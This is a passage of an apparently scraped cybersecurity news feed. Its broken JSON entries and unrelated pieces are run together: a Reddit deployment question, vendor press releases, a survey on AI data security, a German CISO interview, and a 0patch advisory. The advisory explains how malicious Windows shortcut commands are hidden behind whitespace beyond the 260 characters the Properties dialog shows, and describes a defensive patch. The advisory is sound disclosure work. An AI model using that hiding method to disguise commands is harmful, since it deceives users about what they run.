tested pull requests in the application repo. I am not so sure about the release process. My LLM is telling me my releases need to be \"documented & authorized\". The LLM is suggesting I make image id of what's running in prod a part of the infra repo. As in, my deploy script should consume not something developers enter manually into it ad hoc, but a string from a version-controlled config file. So if a developer wants to update prod, they change the config file and create a pull request. Once PR gets approved, the deployment script runs automatically with the updated config file. The PR would be the \"documented & authorized\" artifact. Is that about right? PS Before you ask \"why the hell is your image id not already part of the Terraform config!!!\", we use AWS ECS to orchestrate containers, and Terraform is very-very good at setting up ECS infra, but it's not very good at doing actual _deployments_ of new images to ECS . So I made a conscious decision of splitting deployment pipe into its own python script. submitted by /u/OtherwiseUniversity7 [link] [comments]",

      "title": "Cyber Startup Frenetik Launches with Patented Deception Technology That Bets Against the AI Arms Race",
      "summary": "While most cybersecurity companies pour resources into AI models, massive compute, hoovering up all the data, and enhanced analytics to detect and prevent threats, Frenetik , a Maryland cyber startup, is betting on something simpler: making sure attackers don\u2019t know what defenders know. The company emerged today with a fundamentally different approach using novel cyber deception and a newly issued U.S. patent to back it. \u201cThe industry has turned cybersecurity into a compute and analysis war,\u201d said founder Hans Ismirnioglou. \u201cBigger models, more data, faster analysis. But you can\u2019t out-compute or out-analyze an adversary forever. We\u2019re not trying to. We\u2019re exploiting information asymmetry.\u201d Traditional deception tools deploy fake systems, wait for attackers to find them, and hope they interact. Frenetik\u2019s patented \u201cDeception In-Use\u201d technology (U.S. Patent 12,463,981 \u2013 \u201cSystems and Methods for Counter-Reconnaissance in Cloud Infrastructure to Disrupt Adversarial Targeting\u201d) takes a different path: it continuously rotates actually used identities and resources across Microsoft Entra (M365), AWS, Google Cloud, and on-premises environments. The critical details of who changed, what changed, when, where, and how travel through out-of-band channels accessible only to trusted parties. Defenders stay informed. Attackers work from stale intelligence. \u201cAdversaries, especially AI-driven ones, build models based on reconnaissance. They assume the environment they mapped earlier is the environment they\u2019ll exploit today,\u201d Ismirnioglou explained. \u201cWe break that assumption without needing a bigger GPU cluster by simply depriving them of easily discoverable information.\u201d Users can think of it as musical chairs for hackers: by the time they figure out where to sit, everything has moved\u2014and only defenders know which chairs are real and which have become traps. The technology transforms existing deception tools from passive traps into active ones. When Frenetik rotates real resources, attackers following stale intelligence get funneled straight into honeypots and decoys, supercharging interaction rates with classic deception elements that previously only hoped to look real. Unlike solutions requiring extensive tuning or analyst oversight, Frenetik works because attackers simply lack the information needed to know the difference. \u201cI want the adversary to have to continuously put a dedicated body onto every target they go after \u2013 no more free lunches or easy days for America\u2019s adversaries,\u201d says Ismirnioglou. About Frenetik Frenetik, a Maryland-based cybersecurity startup, just emerged from stealth with a new approach: instead of flooding defenders with more data, it starves attackers of the information they need to move. Focused on measurable security outcomes, and pricing transparency, Frenetik is built to tip the balance of power by denying adversaries trustworthy insight into targeted environments.

      "title": "AI Adoption Surges While Governance Lags \u2014 Report Warns of Growing Shadow Identity Risk",
      "summary": "The 2025 State of AI Data Security Report reveals a widening contradiction in enterprise security: AI adoption is nearly universal, yet oversight remains limited. Eighty-three percent of organizations already use AI in daily operations, but only 13 percent say they have strong visibility into how these systems handle sensitive data. Produced by Cybersecurity Insiders with research support from Cyera Research Labs , the study reflects responses from 921 cybersecurity and IT professionals across industries and organization sizes. The data shows AI increasingly behaving as an ungoverned identity \u2014 a non-human user that reads faster, accesses more, and operates continuously. Yet most organizations still use human-centric identity models that break down at machine speed. As a result, two-thirds have caught AI tools over-accessing sensitive information, and 23 percent admit they have no controls for prompts or outputs. Autonomous AI agents stand out as the most exposed frontier. Seventy-six percent of respondents say these agents are the hardest systems to secure, while 57 percent lack the ability to block risky AI actions in real time. Visibility remains thin: nearly half report no visibility into AI usage and another third say they have only minimal insight \u2014 leaving most enterprises unsure where AI is operating or what data it touches. Governance structures lag behind adoption as well. Only 7 percent of organizations have a dedicated AI governance team, and just 11 percent feel prepared to meet emerging regulatory requirements, underscoring how quickly readiness gaps are widening. The report calls for a shift toward data-centric AI oversight with continuous discovery of AI use, real-time monitoring of prompts and outputs, and identity policies that treat AI as a distinct actor with narrowly scoped access driven by data sensitivity. \u201cAI is no longer just another tool \u2014 it\u2019s acting as a new identity inside the enterprise, one that never sleeps and often ignores boundaries,\u201d said Holger Schulze with Cybersecurity Insiders. \u201cWithout visibility and robust governance, enterprises will keep finding their data in places it was never meant to be.\u201d As the report cautions: \u201cYou cannot secure an AI agent you do not identify, and you cannot govern what you cannot see.\u201d The full 2025 State of AI Data Security Report is available for download at: https://www.cybersecurity-insiders.com/portfolio/2025-state-of-ai-data-security-report-cyera/ Media Contact: Andrea.Chilkott@cybersecurity-insiders.com About Cybersecurity Insiders Cybersecurity Insiders provides strategic insight for security leaders, grounded in more than a decade of independent research and trusted by a global community of 600,000 cybersecurity professionals.

      "title": "Microsoft Silently Patched CVE-2025-9491 - We Think Our Patch Provides More Security",
      "summary": "Patching What You See vs. Patching What You Execute Summary : Trend Micro discovered that attackers have long been using a trick to hide what a Windows shortcut actually does, preventing users from seeing malicious commands. Microsoft decided this was not patch-worthy. Others then found this same trick still being exploited, and the issue got a CVE. Microsoft doubled down, but silently patched the issue so that malicious commands can no longer be hidden. We created a different patch that actually blocks discovered attacks. The story - or at least its public part - begins on March 18, 2025, with Trend Micro's publication of Advisory ZDI-25-148 and an associated article titled Windows Shortcut Exploit Abused as Zero-Day in Widespread APT Campaigns . This article by Peter Girnus and Aliakbar Zahravi describes how they observed close to a thousand malicious Windows shortcut (.lnk) files being used in various offensive campaigns dating back to 2017. These shortcut files were crafted such that viewing their properties in Windows, one could not see the entire commands the shortcuts executed. The trick was an old one: using various \"whitespace\" characters to move the malicious part of the command out of user's sight. For instance, the article shows how Windows 11 would show properties of a shortcut file with a target like this: conhost.exe calc.exe Windows 11 showing an obfuscated target in a Windows shortcut (Image borrowed from Trend Micro's article) As you can see, the Target field shows only space characters (selected, therefore in blue), and even scrolling left or right would not reveal the presence of \" calc.exe \", or whatever malicious command there might be at the end. Instead of space characters, various other characters could be used to achieve a similar effect. As Peter and Aliakbar explained, Microsoft was notified about this issue but decided it didn't meet their bar for servicing. In other words, they would not consider it a vulnerability worth patching. At this point we have to admit we (too?) misunderstood the problem Trend Micro was presenting in April. We thought the issue was just that padding a malicious command with spaces would not show the malicious command in the dialog because the dialog always showed the end of the command - and when padded with spaces, the end is just all spaces. We considered that a bit silly as the user could always scroll back to the start of the field and see everything - and we found Microsoft's decision to not fix this reasonable, albeit the trick was actually being used in malicious campaigns. After all, what could be done? One can't ban whitespace characters from the command string, and if the Properties dialog showed the beginning of the target instead of the end, malicious code could then be hidden at the end. In addition to these technical details, there was also a social engineering aspect: what profile of user gets a PDF-lookalike Windows shortcut file, checks its properties, sees something like \" powershell.exe \" - without the hidden malicious arguments - and based on that still decides to double-click it? Most users, we thought, would either be non-IT persons and not look at properties at all, or would be somewhat IT persons and probably concerned by seeing some script there, likely also scrolling left and right in the Target field to see the whole thing. Following this reasoning, we also decided not to patch this issue. Case closed. Until end of October, that is, when Arctic Wolf published an article titled UNC6384 Weaponizes ZDI-CAN-25373 Vulnerability to Deploy PlugX Against Hungarian and Belgian Diplomatic Entities . UNC6384 is code name for a Chinese-affiliated threat actor, and ZDI-CAN-25373 is Trend Micro's working ID for the described issue. Arctic Wolf identified a campaign by threat actor UNC6384 specifically targeting Hungarian and Belgian diplomatic entities during September and October 2025 - using Windows shortcuts exploiting the described vulnerability. This discovery revived the interest in this issue, which was by then assigned CVE-2025-9491 . Microsoft was under some heat in the media for not having patched this exploited-in-the-wild issue yet, but they doubled-down with and advisory titled Microsoft Guidance on CVE-2025-9491 Windows LNK File UI Behavior . In this advisory, Microsoft claimed that \" during the user experience, the user is warned several times that proceeding may be harmful. \" Now, \" several times \" is a bit of an exaggeration for what must have been just once in described actual attacks, but fact is, if one downloads a .lnk file from the Internet (which has to be packaged in a ZIP archive as browsers deliberately mangle its file name to protect users), it will have Mark of the Web and double-clicking it will warn the user about opening a potentially harmful file from the Internet. That is, unless the attacker knows of some vulnerability that bypasses Mark of the Web like this one . The advisory concludes: \" Due to the user interaction involved and the fact that the system already warns users that this format is untrusted, Microsoft does not consider this a vulnerability. \" Having read this advisory with our then-current understanding of the issue, we still agreed with Microsoft's conclusion. But then we looked again. And finally saw what the issue really was: it was not just the sliding of malicious content out of the Target field's default focus. Instead, a .lnk file structure allows the Target arguments to be a very long string (tens of thousands of characters), but the Properties dialog only shows the first 260 characters , silently cutting off the rest. So it is possible to construct a .lnk file that runs a reeeeealy long PowerShell or BAT script, but only the first 260 characters of it would be shown to the user who viewed its properties. And these characters could be mostly \"whitespace\" characters to push the interesting bits entirely out of the Target field - even if the user scrolled to the very end. Now this makes it more interesting: it's now a matter of trust in the user interface. The string that Windows are showing to you -- is not the entire string that will actually be executed. Even if you're an IT person, you can be fooled by this issue because you rightfully expect the UI can be trusted to show you the whole command. This did look patch-worthy, so we decided to analyze the issue deeper in order to come up with a good patch. While we were developing our patch, the November Patch Tuesday brought new Windows Updates. And as expected (\" Microsoft does not consider this a vulnerability \"), there was no mention of anything remotely akin to this issue among its 63 patched vulnerabilities . However... Microsoft's Patch However, we noticed something did change with November Windows Updates: now, the Properties dialog of a .lnk file shows the entire Target command with arguments, no matter how long it is. The theoretically-up-to-32k-character-long string is now shown in the same single-line field that can't even reveal an entire modest-sized command without selecting some text and moving the mouse left or right. But okay, at least one can select all, copy and paste the string to a text editor. The issue was apparently demoted from vulnerability to functional bug, silently fixed without an advisory, and trust in the user interface was restored. Arguably, if the problem was defined as \"The properties dialog does not always show exactly what will be executed,\" it would indeed have been resolved. But this approach was weird: namely, it has always been the case that the \"ordinary\" way to create or modify a Windows shortcut - via Explorer user interface - only allowed you to enter up to 260 characters to the Target field. The only way for this string to be longer is to create the shortcut programmatically, e.g. using Windows API . (And some application may be creating such legitimate shortcuts for its own use.) So how much would showing all Target characters in a small field improve chances for victims targeted in actual attacks? Our Patch We decided to take a different route: Our premise was that a legitimate non-malicious .lnk file that regular Windows users come across would be created manually and would therefore never have a Target with more than 260 characters. However, we still accept that shortcut files with more than 260 character Target can be valid, just not meant for manual opening by users. Consequently, our patch has the following logic: If the process opening the .lnk file is Windows Explorer, AND the Target has more than 260 characters, then we cut the Target at 260 characters and alert the user that a suspicious .lnk file was shortened. Our patch would break the 1000+ malicious shortcuts identified by Trend Micro for all targeted users, while Microsoft's patch would only allow the most cautious among these users - who would probably not launch such shortcuts anyway - to see the entire malicious command string. Even though malicious shortcuts could be constructed with fewer than 260 characters, we believe disrupting actual attacks detected in the wild can make a big difference for those targeted. Let's see our patch in action. On the video below you can see that a shortcut file looking like a PDF document has a Target that doesn't fully show in the Properties dialog, while a hex editor reveals its full content. Launching it with 0patch disabled results in spawning the calculator (which was hidden from the Properties dialog), but launching it with 0patch enabled results in a security notification and the execution of only the first 260 characters of the shortcut's Target. Micropatch Availability Micropatches were written for the following security-adopted Windows versions: Windows 11 v22H2 - fully updated Windows 11 v21H2 - fully updated Windows 10 v22H2 - fully updated Windows 10 v21H2 - fully updated Windows 10 v21H1 - fully updated Windows 10 v20H2 - fully updated Windows 10 v2004 - fully updated Windows 10 v1909 - fully updated Windows 10 v1809 - fully updated Windows 10 v1803 - fully updated Windows 7 - fully updated with no ESU, ESU 1, ESU 2 or ESU 3 Windows Server 2008 R2 - fully updated with no ESU, ESU 1, ESU 2, ESU 3 or ESU 4 Windows Server 2012 - fully updated with no ESU or ESU 1 Windows Server 2012 R2 - fully updated with no ESU or ESU 1 In addition, patches were written for the following still-supported fully updated Windows Server versions, which for some reason did not receive a patch from Microsoft (note that Server 2025 did get the patch for some reason): Windows Server 2016 Windows Server 2019 Windows Server 2022 Micropatches have already been distributed to, and applied on, all affected online computers with 0patch Agent in PRO or Enterprise accounts (unless Enterprise group settings prevented that). Vulnerabilities like these get discovered on a regular basis, and attackers know about them all. If you're using Windows that aren't receiving official security updates anymore, 0patch will make sure these vulnerabilities won't be exploited on your computers - and you won't even have to know or care about these things. If you're new to 0patch , create a free account in 0patch Central , start a free trial, then install and register 0patch Agent. Everything else will happen automatically. No computer reboot will be needed. Did you know 0patch security-adopted Windows 10 and Office 2016 and 2019 when they went out of support last October, allowing you to keep using them for at least 3 more years (5 years for Windows 10)?

      "title": "Security Guidance Series: CAF 4.0 Building Proactive Cyber Resilience",
      "summary": "It\u2019s Time To Act Microsoft's Digital Defense Report 2025 clearly describes the cyber threat landscape that this guidance is situated in, one that has become more complex, more industrialized, and increasingly democratized. Each day, Microsoft processes more than 100 trillion security signals, giving unparalleled visibility into adversarial tradecraft. Identity remains the most heavily targeted attack vector, with 97% of identity-based attacks relying on password spray, while phishing and unpatched assets continue to provide easy routes for initial compromise. Financially motivated attacks, particularly ransomware and extortion, now make up over half of global incidents, and nation-state operators continue to target critical sectors, including IT, telecommunications, and Government networks. AI is accelerating both sides of the equation: enhancing attacker capability, lowering barriers to entry through open-source models, and simultaneously powering more automated, intelligence-driven defence. Alongside this, emerging risks such as quantum computing underline the urgency of preparing today for tomorrow\u2019s threats. Cybersecurity has therefore become a strategic imperative shaping national resilience and demanding genuine cross-sector collaboration to mitigate systemic risk. It is within this environment that UK public sector organizations are rethinking their approach to cyber resilience. As an Account Executive Apprentice in the Local Public Services team here at Microsoft, I have seen how UK public sector organizations are rethinking their approach to cyber resilience, moving beyond checklists and compliance toward a culture of continuous improvement and intelligence-led defence. When we talk about the UK public sector in this series, we are referring specifically to central government departments, local government authorities, health and care organizations (including the NHS), education institutions, and public safety services such as police, fire, and ambulance. These organizations form a deeply interconnected ecosystem delivering essential services to millions of citizens every day, making cyber resilience not just a technical requirement but a foundation of public trust. Against this backdrop, the UK public sector is entering a new era of cyber resilience with the release of CAF 4.0 , the latest evolution of the National Cyber Security Centre\u2019s Cyber Assessment Framework. This guidance has been developed in consultation with national cyber security experts, including the UK\u2019s National Cyber Security Centre (NCSC), and is an aggregation of knowledge and internationally recognized expertise. Building on the foundations of CAF 3.2, this update marks a decisive shift, like moving from a static map to a live radar. Instead of looking back at where threats once were, organizations can now better anticipate them and adjust their digital defences in real time. For the UK\u2019s public sector, this transformation could not be timelier. The complexity of digital public services, combined with the growing threat of ransomware, insider threat, supply chain compromise, and threats from nation state actors, demands a faster, smarter, and more connected approach to resilience. Where CAF 3.2 focused on confirming the presence and effectiveness of security measures, CAF 4.0 places greater emphasis on developing organizational capability and improving resilience in a more dynamic threat environment. While the CAF remains an outcome-based framework, not a maturity model, it is structured around Objectives, Principles, and Contributing Outcomes, with each contributing outcome supported by Indicators of Good Practice. For simplicity, I refer to these contributing outcomes as \u201ccontrols\u201d throughout this blog and use that term to describe the practical expectations organizations are assessed against. CAF 4.0 challenges organizations not only to understand the threats they face but to anticipate, detect, and respond in a more informed and adaptive way. Two contributing outcomes exemplify this proactive mindset: A2.b Understanding Threat and C2 Threat Hunting. Together, they represent what it truly means to understand your adversaries and act before harm occurs. For the UK\u2019s public sector, achieving these new objectives may seem daunting, but the path forward is clearer than ever. Many organizations are already beginning this journey, supported by technologies that help turn insight into action and coordination into resilience. At Microsoft, we\u2019ve seen how tools like E3, E5, and Sentinel are already helping public sector teams to move from reactive to intelligence-driven security operations. Over the coming weeks, we\u2019ll explore how these capabilities align to CAF 4.0\u2019s core principles and share practical examples of how councils can strengthen their resilience journey through smarter visibility, automation, and collaboration. CAF 4.0 vs CAF 3.2 - What\u2019s Changed and Why It Matters The move from CAF 3.2 to CAF 4.0 represents a fundamental shift in how the UK public sector builds cyber resilience. The focus is no longer on whether controls exist - it is on whether they work, adapt, and improve over time. CAF 4.0 puts maturity at the centre. It pushes organizations to evolve from compliance checklists to operational capability, adopting a threat-informed, intelligence-led, and proactive security posture, by design. CAF 4.0 raises the bar for cyber maturity across the public sector. It calls for departments and authorities to build on existing foundations and embrace live threat intelligence, behavioural analytics, and structured threat hunting to stay ahead of adversaries. By understanding how attackers might target essential services and adapting controls in real time, organizations can evolve from awareness to active defence. Today\u2019s threat actors are agile, persistent, and increasingly well-resourced, which means reactive measures are no longer enough. CAF 4.0 positions resilience as a continuous process of learning, adapting, and improving, supported by data-driven insights and modern security operations. CAF 4.0 is reshaping how the UK\u2019s public sector approaches security maturity. In the coming weeks, we\u2019ll explore what this looks like in practice, starting with how to build a deeper understanding of threat (control A2.b) and elevate threat hunting (control C2) into an everyday capability, using the tools and insights that are available within existing Microsoft E3 and E5 licences to help support these objectives. Until then, how ready is your organization to turn insight into action?",

Reddit is really pushing the bounds of what's acceptable when they allow this slop. Also note that reporting and blocking don't work.

Aus Sicht von Experten und des Bundesamtes f\u00fcr Sicherheit in der Informationstechnik (BSI) muss der Schutz in diesem Bereich massiv erh\u00f6ht werden. Wie beurteilen Sie die aktuelle Lage in Deutschland? Rei\u00df: Die geopolitischen Spannungen, die wir aktuell sehen, f\u00fchren zu einer erh\u00f6hten Bedrohungslage. Das betrifft nat\u00fcrlich auch die Heizungsbranche, in der Vaillant t\u00e4tig ist und die das Grundbed\u00fcrfnis aller Menschen nach W\u00e4rme und Warmwasser zu Hause erf\u00fcllt. Solche Bereiche m\u00fcssen auf jeden Fall verst\u00e4rkt gesch\u00fctzt werden. Das Problem ist, dass die Angriffe immer gezielter und komplexer werden. Heutzutage haben wir es nicht mehr mit den weniger erfahrenen Script Kiddies aus dem heimischen Keller, sondern mittlerweile mit gut organisierten und professionellen Cyberkriminellen zu tun. Ziel ist es, dem Unternehmen beziehungsweise der Wirtschaft des jeweiligen Landes zu schaden. Hinzu kommt, dass die Eintrittsschwelle f\u00fcr Angriffe auf Unternehmen und die Lieferkette durch die Nutzung von k\u00fcnstlicher Intelligenz im Unternehmen viel geringer als je zuvor ist. Dadurch wird es beispielsweise einfacher, gezielte Phishing-E-Mails zu verfassen oder Malware zu entwickeln, was zuvor mit deutlich h\u00f6herem Aufwand verbunden war. Wie reagieren Sie auf die ver\u00e4nderte Situation? Wie sch\u00fctzen Sie Ihr Unternehmen aktuell vor Cyberattacken? Rei\u00df: Wir verfolgen einen ganzheitlichen Ansatz in der Informationssicherheit. Das bedeutet, wir schauen uns wirklich alle Themen von oben bis unten an und setzen auf ein mehrschichtiges Sicherheitskonzept. Dabei werden sowohl pr\u00e4ventive als auch reaktive Sicherheitsma\u00dfnahmen einbezogen, um im Ernstfall schnell und effektiv reagieren zu k\u00f6nnen. Dabei ist uns bewusst: Kein Unternehmen kann absolute Sicherheit garantieren. Deshalb sollte jeder mit der Annahme planen, dass ein erfolgreicher Angriff jederzeit m\u00f6glich ist. Wir legen nicht nur Wert auf die Absicherung unserer internen IT-Landschaft, sondern auf unsere weltweite Produktion und Produkte f\u00fcr unsere Kunden. Dabei stehen der Schutz unserer Endkunden und die Einhaltung hoher Sicherheitsstandards f\u00fcr uns im Mittelpunkt \u2013 insbesondere angesichts der wachsenden Bedrohung durch Ransomware-Angriffe. Unser Fokus liegt darauf, proaktiv Risiken zu minimieren und das Vertrauen in unsere L\u00f6sungen langfristig zu sichern. Und die Mitarbeiter? Cybersicherheit beginnt beim Menschen. Durch die globale Vernetzung bei Vaillant legen wir in Sachen Security ganz klar den Fokus darauf. Durch unseren holistischen 4-S\u00e4ulen-Ansatz setzen wir auf eine umfassende Sensibilisierung unserer gesamten Belegschaft, von Gamification-Ans\u00e4tzen bis hin zu praxisnahen Compliance-Schulungen. Dabei greifen wir auch Themen aus dem privaten Umfeld auf, wie etwa Phishing-Beispiele einiger Telekommunikationsunternehmen oder Paketzustelldienste, um die Relevanz zu erh\u00f6hen und nachhaltige Lernprozesse zu f\u00f6rdern. Welche Herausforderungen machen CISOs aktuell am meisten zu schaffen? Rei\u00df: Zun\u00e4chst einmal: Die Rolle des CISO hat sich in den vergangenen Jahren grundlegend gewandelt. Fr\u00fcher lag der Fokus prim\u00e4r auf technischen Aspekten und operativer Sicherheit. Heute sind strategische Ausrichtung und Leadership-Kompetenzen zentrale Schl\u00fcsselqualifikationen. Ein moderner CISO muss nicht nur technologische Risiken managen, sondern auch als Sparringspartner des Managements agieren, Business-Risiken bewerten und die Informationssicherheit als integralen Bestandteil der Unternehmensstrategie verankern.. Aus meiner Sicht liegen aktuell die gr\u00f6\u00dften Herausforderungen darin, die neuen gesetzlichen Vorgaben wie NIS2, DORA und Cyber Resilience Act umzusetzen. Ich bezeichne das Ganze als Regulatorik-Dschungel, der erst einmal verstanden werden muss. Wir bewegen uns in einem komplexen Regulierungsumfeld, das pragmatisch interpretiert und mit den richtigen Ressourcen umgesetzt werden muss. Am Ende geht es nicht nur darum, die Compliance zu gew\u00e4hrleisten, sondern das Sicherheitslevel im gesamten Unternehmen zu erh\u00f6hen, um eine erh\u00f6hte Resilienz zu schaffen. Haben wir zu viele Sicherheitsregeln? Rei\u00df: In der Heizungsbranche sind die regulatorischen Anforderungen \u00fcberschaubar, auch wenn NIS2 und weitere relevant sind. Grunds\u00e4tzlich begr\u00fc\u00dfe ich einheitliche Standards, da sie die Sicherheit in Deutschland und Europa erh\u00f6hen. Die Herausforderung liegt in der nationalen Umsetzung: Jedes Land interpretiert die Vorgaben unterschiedlich, was f\u00fcr international t\u00e4tige Unternehmen eine erhebliche Komplexit\u00e4t bedeutet. Einheitliche und pragmatische Sicherheitsregeln f\u00fcr Europa zur Umsetzung zu entwicklen ist dem Gesetzgeber von NIS2 nicht gelungen. NIS2 wurde zwar auf EU-Ebene verabschiedet, muss aber in die lokale Gesetzgebung der jeweiligen L\u00e4nder \u00fcberf\u00fchrt werden. Das bedeutet, dass jedes Land seine eigene Interpretation mit einbringt. Organisationen, die europaweit t\u00e4tig sind, m\u00fcssen dabei jegliche Gesetzgebung auch in der jeweiligen Region ber\u00fccksichtigen. An dieser Stelle ein standardisiertes Verfahren zu gew\u00e4hrleisten bedeutet zus\u00e4tzliche Komplexit\u00e4t und hohen Abstimmungsaufwand. Warum k\u00e4mpfen so viele Unternehmen aktuell noch bei der Umsetzung? Rei\u00df: Oft fehlt die Klarheit bei der Auslegung der Vorgaben. Viele Unternehmen \u2013 insbesondere KMU \u2013 wissen nicht, ob sie \u00fcberhaupt in den Geltungsbereich fallen. Hinzu kommen Fragen zur Ressourcenzuteilung: Soll die Umsetzung intern erfolgen oder mit externen Partnern? Wer \u00fcbernimmt die Verantwortung \u2013 die IT, die Compliance-Abteilung oder ein dediziertes Security-Team? Zus\u00e4tzlich mangelt es h\u00e4ufig an Reifegrad und Bewusstsein, wo und wie Cybersicherheit strategisch verankert werden muss, damit derartige Themen angemessen umgesetzt werden k\u00f6nnen. Diese Faktoren l\u00e4hmen den Fortschritt und kosten Unternehmen entscheidende Zeit. Ein \u201eKochrezept\u201c f\u00fcr Regularien gibt es nicht. Ich empfehle Unternehmen Ihre Ausgangslage zu analysieren, erste Schritte zu definieren und loszulegen. Mein Motto lautet: Starten statt Warten!",

      "title": "Key questions CISOs must ask before adopting AI-enabled cyber solutions",
      "summary": "Adversaries are hijacking AI technology for their own purposes, generating deepfakes , creating clever phishing lures , and launching novel types of advanced attacks. They are also targeting AI systems with prompt injection attacks aimed at tricking models into revealing sensitive data. And users are leaking sensitive data through the unauthorized or careless use of AI. CISOs who don\u2019t respond to these threats with their own AI-powered defenses are putting their organizations at risk. According to IBM\u2019s 2025 Cost of a Data Breach report, based on a survey by the Ponemon Institute, organizations that extensively deployed AI across their enterprise cybersecurity defenses slashed the amount of time it took to recover from a breach by 80 days, lowering their average breach cost by $1.9 million . And 20% of organizations surveyed said they suffered a breach due to security incidents involving shadow AI. The additional breach cost associated with high levels of shadow AI was an estimated $670,000, according to the report. Virtually every established security vendor and scores of startups are touting AI-powered security solutions. Incumbents are embedding AI into their existing toolsets. And startups are offering autonomous agents that address specific areas such as vulnerability assessments, email security, endpoint security, or cloud data security. IDC analyst Craig Robinson says, \u201cVendors are rapidly embedding AI and generative AI into their incident response workflows to enhance speed, accuracy, and scalability.\u201d Key applications include threat detection, triage, and anomaly detection; generative AI for automated report generation, timeline reconstruction, and executive summaries; natural language queries for log analysis and threat hunting; and AI agents for malware analysis, code interpretation, and adversary behavior prediction. A survey of CISOs conducted by Splunk reveals that the top use cases for AI and gen AI security are threat detection, triaging alerts, querying security data, automating alert management and response, threat hunting, suggesting investigation steps, threat analysis, and processing phishing emails. Novel uses of AI for defense are rapidly evolving, including machine-learning generative adversarial networks. And agentic AI use cases for cybersecurity are already on the horizon. For CISOs looking to enhance their security defenses with AI-powered tools, here are some key questions to ask prospective AI security vendors. But before CISOs engage with vendors, it\u2019s important to get your ducks in a row. What CISOs need to think about before talking to vendors How does the use of AI at my organization expand our attack surface? It\u2019s important to get a clear picture of how current and future AI implementations at your organization create new potential vulnerabilities. Achieving that clarity will require asking a wide range of questions that span the organization and beyond. For example, are we deploying or planning to deploy clusters of GPU-based servers in the data center to run AI workloads? Will my current network detection and response tools be able to handle this surge in additional traffic? Are software developers writing new AI apps? How do I protect that development pipeline? How is AI being embedded in my organization\u2019s supply chain? Are we currently building or planning to build our own LLMs on premises, in the cloud, or will we be using third-party LLMs? Everyday SaaS productivity tools incorporate AI into workflows; how do I protect that back-and-forth traffic, which might contain sensitive information? According to the IBM-Ponemon breach report, 13% of surveyed organizations have experienced an attack on their AI models or applications. \u201cThat percentage is small, for now. We are likely to see many more in the coming 12 months, unless security leaders and their business counterparts recognize the risk and pivot to focus more intently on AI security,\u201d says the report. What is my risk tolerance, level of maturity, and regulatory environment? There\u2019s no point in buying an agentic tool that the vendor claims to be capable of acting autonomously, if the culture of your shop is that these types of tools won\u2019t be completely trusted or properly deployed. Your security practitioners might not get full value out of them or might not use them at all. If your organization is in a highly regulated industry, will it pass muster with the auditors if your logs and other telemetry data are sent to the cloud for processing? What problem am I trying to solve ? Before jumping into an AI security solution, CISOs need to clearly identify the highest priority risks. Are you worried about data leakage, ransomware, incident response, data privacy regulations, securing the application development pipeline, securing assets in the cloud? Or all the above? It\u2019s important to align your most critical needs with the strengths of the vendor solution. Platform or point product? The perennial point product vs. platform conundrum applies to AI security as well. If my organization has an incumbent security platform vendor and is satisfied with that vendor, does the incumbent offer sufficient AI security capabilities to meet my needs, currently and in the future? Or do I need to seek out point products to address specific gaps? Questions to ask vendors about their AI security offerings There are several areas where CISOs will want to focus their attention when considering AI-powered cyber solutions, including the following: Shadow AI: Uncovering and addressing shadow AI throughout the organization is a key issue for security leaders today. But so too is ensuring that sanctioned AI-enabled solutions are not misused in similar ways.To protect against this, CISOs should ask: Does the vendor offer discovery capabilities to help identify shadow AI usage? What policies and procedures, education and training, identity management and access control, data leakage protection, does the vendor offer to enable employees to continue to use AI, while layering on security features? Data protection: The superpower of AI security tools is their ability to ingest and process vast amounts of data in near real-time. But where does that data reside? On-prem, in the cloud, or both? Who is responsible for protecting LLMs and other data stores both at rest and in motion? If the vendor is using homegrown or third-party AI models, and providing conduits to the customer\u2019s third-party AI models, how does the vendor protect those pipelines? How does the security team detect vulnerabilities or data leakage in a \u201cblack box\u201d LLM? Who is responsible for protecting LLMs against prompt injection attacks or other types of model manipulation? Will my data be used to train the vendor\u2019s models and, if so, how can I be sure that data is protected? Metrics: Much of the initial hype surrounding AI has turned to disappointment because organizations are struggling to identify benefits from AI pilot projects . CISOs need to be able to provide measurable results for any AI security tool. That can include improved mean-time-to-discovery (MMTD) and mean-time-to-recovery (MTTR) in the event of a breach, a quantifiable reduction in the rate of false positives, improved productivity among SOC staffers, increased accuracy of anomaly detection and threat hunting activities. CISOs should ask vendors and advisors, What metrics will best reflect the value these AI capabilities will have, and can those be captured to help assess the efficacy of the AI capabilities and our use of them? Workforce: What kind of training does the vendor provide for the most efficient use of AI, generative AI, and most importantly, agentic AI. Will the AI tool be able to automate low-level tasks so that my SOC analysts can focus on higher-level activities? How does the vendor offering help me to address the skills gap? Are there models and best practices for reorganizing my workforce for the era of AI. Will the use of AI security tools help address overwork and burnout among my staff? Are there specific guidelines or best practices for how my security team should interact with the AI in a human-in-the-loop, copilot-style scenario? Integration: How will the AI security tool integrate with my current security stack and my security processes and procedures? Most CISOs already have an overload of tools \u2014 EDR, XDR, SIEM, SOAR, CSPM, etc. What APIs and pre-built connections are provided to seamlessly integrate with my existing infrastructure? What types of agreements and alliances do you have with other vendors? How can I maintain a single dashboard? If a platform vendor has recently acquired an AI security tool, how well is that new capability integrated within the platform? Regulation: How will your tool conform to the specific regulatory requirements in my industry with regard to data storage and data privacy. Do you keep up with changes to regulations? Trust: How can I make sure that my security team trusts the decisions and recommendations that the AI systems make? In what ways can security practitioners go back and retrace how a model reached a conclusion? Scalability: It\u2019s to be expected that data stores will increase in volume. And an enterprise might pilot the tool at one location, with plans to roll it out globally. How can I be sure the cloud-based AI tools can scale to meet my needs? Can the system handle large traffic volumes without performance delays. Does the solution encompass endpoints, networks, cloud, SaaS? Roadmap: What is your roadmap for updating the tool, delivering timely patches and providing new capabilities on a regular basis? Model integrity: How do you address concerns about bias in your models. How do you ensure data accuracy and integrity? How do you assure that the models are constantly updated to reflect changing real-world conditions. Vendor credibility : How long has this vendor been around? Do they have leaders with an industry pedigree? Do they have references that you can check? What is the financial viability of the company? For a startup, how much money have they raised? Are they generating revenue? Cost: What are the licensing terms? What types of SLAs or other performance metrics are included with a subscription?",

